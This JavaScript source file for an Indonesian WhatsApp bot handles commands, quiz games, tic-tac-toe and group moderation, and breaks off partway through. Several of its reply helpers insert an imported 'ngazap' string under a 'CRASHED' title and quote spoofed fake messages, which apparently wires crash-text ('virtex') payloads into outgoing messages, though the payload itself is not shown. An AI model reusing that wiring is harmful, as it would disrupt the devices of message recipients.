/**
   * Create By Arthur.
   * Contact Me on wa.me/6283156715878
   * Follow https://github.com/Arthur200806
*/

require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const { color, bgcolor } = require('./lib/color')

const { buttonvirus } = require('./faraxx/buttonvirus')
const { ngazap } = require('./faraxx/ngazap')
const { jobot } = require('./faraxx/jobot')

const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const wita = moment.tz('Asia/Makassar').format("HH:mm:ss")
const wit = moment.tz('Asia/Jayapura').format("HH:mm:ss")
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = hisoka = async (hisoka, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await hisoka.decodeJid(hisoka.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
     	const from = mek.key.remoteJid
        // Group
        const groupMetadata = m.isGroup ? await hisoka.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
	
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = db.data.users[m.sender]
            if (typeof user !== 'object') db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = db.data.chats[m.chat]
            if (typeof chats !== 'object') db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
	    if (!('anticall' in setting)) setting.anticall = true
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false
		if (!('templateLocation' in setting)) setting.templateLocation = false
	    } else global.db.data.settings[botNumber] = {
	    anticall: true,
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
		templateLocation: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	    
        // Public & Self
        if (!hisoka.public) {
            if (!m.key.fromMe) return
        }

        // Push Message To Console && Auto Read
        if (m.message) {
            hisoka.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	//function Reply Fardan
//=================================================//
// Fake Next Projext
 const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`© ${ownername}`, "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `© ${ownername}`, 'jpegThumbnail': thumb}}}
const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${pushname}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
//=================================================//
  // Random Image Simple Menu
let picaks = ['flaming','fluming','flarun,flasmurf']
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
// Reply Kalau Mau Pake Tinggal Ubah aja freply Ke freply = replace aja semua 
/*const freply = (teks) => {
hisoka.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${botname}`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": thumb,"sourceUrl": `${myweb}`}}}, { quoted: m })
}   */
//=================================================//
// Kontak
 const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
const bacito = (jid, text, quoted = fkontak) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//GCLINK
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `© ${ownername}`, 'jpegThumbnail': thumb}}}
const bacit = (jid, text, quoted = fgclink) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//Document
const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
const bacot = (jid, text, quoted = fdoc) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
// VN 
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
const thejo = (jid, text, quoted = fvn) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//Lokasi
const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: thumb}}}
const thejobot = (jid, text, quoted = floc) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//Troli
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: thumb, surface: 200, message: `© ${ownername}`, orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const review = (jid, text, quoted = ftroli) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//image
const ctlg = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
const reply = (jid, text, quoted = ctlg) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
const freply = (teks) => {
hisoka.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply":{"title": `By ${pushname}`,"showAdAttribution": true,"body": `ī.am/𝙵𝚊𝚛𝚍𝚊𝚗ꪶ͢𝚍𝚎𝚟ꫂ⁩`,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/8aaadb4fd36f17f36fc7f.jpg`,"thumbnail": thumb,"sourceUrl": `https://wa.me/6281523940672?text=Lorddd`}}}, { quoted: m})
        }
//=================================================//
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await hisoka.updateProfileStatus(`${hisoka.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        freply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return freply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await hisoka.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return freply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return freply(`Ehh maaf kamu admin`)
        if (isCreator) return freply(`Ehh maaf kamu owner bot ku`)
        hisoka.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: hisoka.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, hisoka.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        hisoka.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            hisoka.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await freply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // freply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    freply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    hisoka.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    hisoka.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) hisoka.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) hisoka.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    hisoka.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    freply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    freply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) hisoka.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    hisoka.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            freply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            hisoka.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}`)
            user.afkTime = -1
            user.afkReason = ''
        }
	    
        switch(command) {
	    case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                freply(`${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
            }
            break	
        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            freply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
